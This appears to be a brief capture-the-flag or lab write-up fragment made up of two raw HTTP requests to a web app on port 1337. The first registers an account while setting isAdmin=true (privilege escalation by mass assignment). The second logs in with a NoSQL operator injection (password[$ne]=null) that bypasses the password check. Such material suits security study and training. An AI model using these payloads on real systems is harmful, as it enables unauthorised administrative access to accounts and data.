Register a new user with isAdmin value is true
```
POST /register HTTP/1.1
Host: 143.42.131.80:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://143.42.131.80:1337
Connection: close
Referer: http://143.42.131.80:1337/login
Upgrade-Insecure-Requests: 1


email=adminjk&password=adminjk&isAdmin=true
```

Login:
```
POST /login HTTP/1.1
Host: 143.42.131.80:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://143.42.131.80:1337
Connection: close
Referer: http://143.42.131.80:1337/login
Upgrade-Insecure-Requests: 1


email=adminjk&password[$ne]=null
```
